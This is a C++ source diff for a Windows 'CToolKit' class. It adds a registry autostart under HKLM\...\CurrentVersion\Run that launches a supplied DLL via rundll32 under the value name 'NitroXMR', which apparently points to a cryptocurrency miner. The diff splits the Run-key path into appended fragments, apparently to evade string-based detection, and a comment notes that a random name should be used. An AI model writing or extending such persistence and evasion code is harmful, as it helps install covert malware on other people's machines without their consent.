@@ -19,10 +19,12 @@ BOOL CToolKit::IsKeyEdit()
 	{
 		printf("[+] Backup Privilege OK \n");
 	}
-	
-	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
-	{
 
+	CString keyItem(L"Software\\Microsoft\\");
+	keyItem.Append(L"Windows\\CurrentVersion\\Run");
+	//写入自启动项吧
+	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, keyItem))
+	{
 		printf("[+] Open Reg OK \n");
 		bKeyEdit = TRUE;
 		reg.Close();
@@ -54,31 +56,34 @@ BOOL CToolKit::setAutoRun(PCWSTR szFileFullPath)
 						//折腾了半天就是说怎么打得开写的入就是没有!!!!!!F**K
 						//都上atl了,不过也挺好用
 
-	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
+	CString keyItem(L"Software\\Microsoft\\");
+	keyItem.Append(L"Windows\\CurrentVersion\\Run");
+
+	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, keyItem))
 	{
 		printf("[+] Open Reg OK \n");
 
 		HKEY hKey = reg.m_hKey;
-		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
+		//if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
 		{
 			printf("%d\n", reg.m_hKey);
 
 			//应该传入随机名称这里先代替掉
 			//GetModuleFileName(NULL, executePath, MAX_PATH);
 			
-			TCHAR keyValue[64];
+			TCHAR keyValue[MAX_PATH];
 
-			wsprintf(keyValue, L"rundll32.exe", szFileFullPath);
+			wsprintf(keyValue, L"rundll32.exe %s %s", szFileFullPath , L",TestRun");
 
 			reg.SetStringValue(L"NitroXMR", keyValue);
 
 			printf("[+] Write Reg OK\n");
 
 		}
-		else
-		{
-			printf("[-] Write Reg Failed\n");
-		}
+		//else
+		//{
+		//	printf("[-] Write Reg Failed\n");
+		//}
 		reg.Close();
 		return TRUE;
 	}
